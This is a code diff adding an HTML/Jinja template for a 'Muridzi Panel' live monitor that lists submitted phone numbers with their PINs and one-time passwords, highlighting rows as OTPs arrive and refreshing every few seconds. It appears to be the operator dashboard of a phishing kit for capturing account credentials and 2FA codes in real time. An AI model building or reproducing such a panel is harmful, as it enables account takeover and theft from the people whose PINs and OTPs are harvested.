@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Muridzi Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Auto refresh every 10 seconds -->
+    <meta http-equiv="refresh" content="5">
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
+            color: #222;
+        }
+
+        header {
+            background: #0A4D8C;
+            color: #fff;
+            padding: 15px 20px;
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+
+        .container {
+            padding: 20px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: #fff;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
+
+        th, td {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+            text-align: left;
+            font-size: 0.9rem;
+        }
+
+        th {
+            background: #f0f2f5;
+            font-weight: 600;
+        }
+
+        tr:hover {
+            background: #f9fbfd;
+        }
+
+        /* Highlight rows where OTP exists */
+        .otp-received {
+            background: #e9f8ee;
+            animation: pulse 1.2s ease-in-out infinite alternate;
+        }
+
+        @keyframes pulse {
+            from { background-color: #e9f8ee; }
+            to { background-color: #d6f2df; }
+        }
+
+        .status {
+            font-weight: bold;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 0.75rem;
+            color: #666;
+        }
+    </style>
+</head>
+
+<body>
+
+<header>
+    Muridzi · Live Verification Monitor
+</header>
+
+<div class="container">
+
+    <table>
+        <thead>
+            <tr>
+                <th>Phone</th>
+                <th>Status</th>
+                <th>Time</th>
+                <th>OTP</th>
+                <th>PIN</th>
+            </tr>
+        </thead>
+        <tbody>
+
+        {% for s in submissions %}
+            <tr class="{% if s.otp %}otp-received{% endif %}">
+                <td>{{ s.phone }}</td>
+                <td class="status">
+                    {% if s.otp %}
+                        OTP Received
+                    {% else %}
+                        PIN Only
+                    {% endif %}
+                </td>
+                <td>{{ s.time }}</td>
+                <td>{{ s.otp if s.otp else "—" }}</td>
+                <td>{{ s.pin }}</td>
+            </tr>
+        {% else %}
+            <tr>
+                <td colspan="5">No submissions yet</td>
+            </tr>
+        {% endfor %}
+
+        </tbody>
+    </table>
+
+    <div class="footer">
+        Auto-refresh every 10 seconds · Local & Render compatible
+    </div>
+
+</div>
+
+</body>
+</html>
